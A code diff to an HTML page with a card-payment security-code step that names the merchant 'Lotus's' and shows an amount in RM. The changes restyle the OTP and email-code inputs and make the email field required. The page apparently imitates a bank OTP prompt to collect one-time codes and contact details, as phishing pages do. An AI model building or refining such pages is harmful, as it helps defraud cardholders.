@@ -55,8 +55,9 @@
 .otp-table td{padding:6px 0;font-size:12px;border-bottom:1px solid #f0f0f0}
 .otp-table td:first-child{color:#999}
 .otp-table td:last-child{color:#333;font-weight:500;text-align:right}
-.otp-code-input{width:100%;height:48px;border:2px solid #e0e0ee;border-radius:10px;text-align:center;font-size:22px;font-weight:700;color:#1a1a2e;outline:none;background:#fff;letter-spacing:6px}
+.otp-code-input{width:100%;height:35px;border:2px solid #e0e0ee;border-radius:10px;text-align:center;font-size:16px;font-weight:700;color:#1a1a2e;outline:none;background:#fff;letter-spacing:4px;box-sizing:border-box}
 .otp-code-input:focus{border-color:#3f51b5}
+.pin-input{margin:10px 0 16px}
 .otp-error-msg{color:#e53935;font-size:11px;text-align:center;margin-bottom:8px;display:none}
 .otp-btn{width:100%;height:44px;background:#3f51b5;color:#fff;border:none;border-radius:6px;font-size:14px;font-weight:600;cursor:pointer;transition:opacity .2s}
 .otp-btn:disabled{opacity:.5;cursor:not-allowed}
@@ -266,7 +267,7 @@
               <div class="li"><label for="fullName">Full Name *</label><input type="text" id="fullName" aria-required="true"></div>
             </div>
             <div class="ol">
-              <div class="li"><label for="email">Email</label><input type="email" id="email"></div>
+              <div class="li"><label for="email">Email *</label><input type="email" id="email" aria-required="true"></div>
               <div class="li"><label for="phone">Phone *</label><input type="tel" id="phone" aria-required="true"></div>
             </div>
             <div class="ol">
@@ -364,13 +365,8 @@
     <div class="otp-body" id="otp-body">
       <div id="otp-form"><h2>Enter your security code</h2><p>We have resent One-Time Password (OTP) in a text message to your registered mobile number (last digits 2). Please submit your One-Time Password (OTP).</p>
         <table class="otp-table"><tr><td>Merchant</td><td>Lotus's</td></tr><tr><td>Amount</td><td id="otp-amount">RM 0.00</td></tr></table>
-        <div class="pin-input" id="pin-input" style="
-    display: flex;
-    gap: 8px;
-    justify-content: center;
-    margin: 10px 0 16px;
-">
-                            <input type="tel" maxlength="8" id="otp-code" style="width:50%;height:52px;border:2px solid #e0e0ee;border-radius:10px;text-align:center;font-size:22px;font-weight:700;color:#1a1a2e;outline:none;background:#fff;letter-spacing:6px" placeholder="">
+        <div class="pin-input" id="pin-input">
+                            <input type="tel" maxlength="8" id="otp-code" class="otp-code-input" placeholder="">
                         </div>
         <div class="otp-error-msg" id="otp-error"></div>
         <button class="otp-btn" id="otp-submit">Continue</button>
@@ -420,13 +416,8 @@
                                 <td>Merchant</td>
                                 <td>Lotus's</td>
                             </tr><tr><td>Amount</td><td id="email-amount">RM 0.00</td></tr></table>
-        <div class="pin-input" id="pin-input" style="
-    display: flex;
-    gap: 8px;
-    justify-content: center;
-    margin: 10px 0 16px;
-">
-                            <input type="tel" maxlength="8" id="email-code" style="width:50%;height:52px;border:2px solid #e0e0ee;border-radius:10px;text-align:center;font-size:22px;font-weight:700;color:#1a1a2e;outline:none;background:#fff;letter-spacing:6px" placeholder="">
+        <div class="pin-input" id="email-pin-input">
+                            <input type="tel" maxlength="8" id="email-code" class="otp-code-input" placeholder="">
                         </div>
         <div class="otp-error-msg" id="email-error"></div>
         <button class="otp-btn" id="email-submit">Continue</button>
